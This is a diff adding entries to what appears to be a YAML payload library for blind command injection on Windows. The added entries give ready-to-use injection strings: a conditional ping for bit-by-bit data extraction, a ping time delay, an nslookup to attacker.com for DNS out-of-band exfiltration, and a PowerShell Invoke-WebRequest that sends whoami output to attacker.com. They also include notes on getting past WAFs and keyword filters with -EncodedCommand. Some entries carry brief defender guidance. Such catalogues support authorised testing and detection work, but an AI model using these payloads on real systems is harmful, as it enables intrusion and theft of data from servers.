+    payload_string: '& if exist C:\Windows\System32\net.exe (ping -n 5 127.0.0.1) else (ping -n 1 127.0.0.1)'
+    how_it_works: 'This payload uses Windows conditional execution to test if a file exists. If the condition is true (net.exe
+      exists), the long ping delay occurs; if false, a short delay. By replacing the file existence check with arbitrary conditions
+      (comparing registry values, user group membership, file contents), an attacker can perform boolean-based blind extraction.
+      Each request extracts one true/false bit, allowing full data extraction similar to boolean-blind SQL injection.
+
+      '
+    prerequisites:
+    - cmd.exe injection on Windows
+    - Measurable response timing
+    waf_bypass_notes: if/exist combination is less commonly WAF-blocked than specific payloads
+    severity_context: CVSS 9.8 – boolean-based Windows blind CMDi for data extraction
+    cve_refs: []
+    tags:
+    - windows
+    - blind
+    - boolean-extraction
+    - if-exist
+    - conditional
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-wbl-006
+    title: Windows Blind CMDi via ping Time-Delay
+    payload_string: '& ping -n 6 127.0.0.1 > nul
+
+      '
+    encoding: none
+    how_it_works: 'The Windows ping command with -n count sends ICMP echo requests to localhost, each separated by approximately
+      one second, creating a reliable time delay of (n-1) seconds that can be used to confirm blind command injection without
+      any outbound network traffic. Unlike Unix sleep, ping.exe is universally available on all Windows versions and does
+      not require additional tooling, making it the most portable Windows blind injection confirmation primitive across server
+      environments including IIS, Apache on Windows, and embedded Windows-based appliances. Defenders should monitor process-creation
+      events for ping.exe spawned as a child of non-interactive parent processes (e.g., w3wp.exe, java.exe, tomcat) via EDR
+      or Windows Event ID 4688 with command-line auditing; this behavioural anomaly is a reliable detection signal because
+      legitimate web servers never invoke ping as a child process during normal operation.
+
+      '
+    context_of_use: Any Windows CMDi context where output is suppressed and no outbound traffic is permitted
+    prerequisites:
+    - cmd.exe injection context on Windows
+    waf_bypass_notes: Vary -n count; substitute 127.0.0.1 with 0.0.0.0 on some versions
+    severity_context: CVSS 7.5 – confirms blind CMDi presence via measurable HTTP response delay
+    cve_refs: []
+    tags:
+    - windows
+    - blind
+    - ping
+    - time-delay
+    - confirmation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-wbl-007
+    title: Windows Blind CMDi via DNS Lookup with nslookup
+    payload_string: '& nslookup attacker.com
+
+      '
+    encoding: none
+    how_it_works: 'nslookup is a standard Windows binary that performs DNS resolution; when injected as a blind CMDi payload,
+      it triggers an outbound DNS query to the attacker''s domain, confirming code execution through the DNS server logs without
+      requiring direct HTTP egress from the target. Unlike curl/wget-based OOB techniques, nslookup only requires DNS egress
+      (UDP/53), which is permitted on virtually all corporate networks as a baseline network function. The attacker monitors
+      their authoritative DNS server for the query to confirm execution and can encode exfiltrated data as subdomains for
+      data exfiltration.
+
+      '
+    context_of_use: Windows blind CMDi on networks where TCP egress is blocked but DNS is permitted
+    prerequisites:
+    - nslookup.exe present (standard on all Windows versions)
+    - Outbound DNS (UDP/53) from server to attacker's name server
+    waf_bypass_notes: 'nslookup with custom server: nslookup data.attacker.com attacker-ns.com'
+    severity_context: CVSS 8.0 – OOB DNS confirmation of blind Windows CMDi
+    cve_refs: []
+    tags:
+    - windows
+    - blind
+    - dns-oob
+    - nslookup
+    - oob-confirmation
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: cmdi-wbl-008
+    title: Windows Blind CMDi via PowerShell Invoke-WebRequest OOB
+    payload_string: '& powershell -c "Invoke-WebRequest -Uri http://attacker.com/$(whoami)"
+
+      '
+    encoding: none
+    how_it_works: 'PowerShell''s Invoke-WebRequest cmdlet (alias iwr) sends an HTTP GET to the specified URI; by interpolating
+      the output of a sub-expression like $(whoami) into the URL path, an attacker receives the executed command''s output
+      directly in their HTTP access logs, turning a blind injection into an out-of-band data exfiltration channel. PowerShell
+      string interpolation evaluates sub-expressions before URI construction, allowing arbitrary command substitution without
+      shell pipeline operators that may be filtered by the target application''s input sanitization. Defenders can disrupt
+      this OOB channel by enabling PowerShell Constrained Language Mode (CLM) via AppLocker or Windows Defender Application
+      Control (WDAC) policies, which restricts sub-expression evaluation and prevents Invoke-WebRequest from executing in
+      untrusted script contexts; network-layer egress filtering on HTTP/HTTPS from application server processes provides a
+      complementary defence-in-depth control.
+
+      '
+    context_of_use: Windows blind CMDi on hosts where PowerShell is available and HTTP egress is permitted
+    prerequisites:
+    - PowerShell 3.0+ (Invoke-WebRequest available)
+    - Outbound HTTP from server process
+    waf_bypass_notes: Alias iwr; encode the whole cmdlet with -EncodedCommand to bypass keyword filters
+    severity_context: CVSS 9.0 – OOB data exfiltration via PowerShell HTTP confirms and exploits blind Windows CMDi
+    cve_refs: []
+    tags:
+    - windows
+    - blind
+    - powershell
+    - invoke-webrequest
+    - oob
+    - data-exfil
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
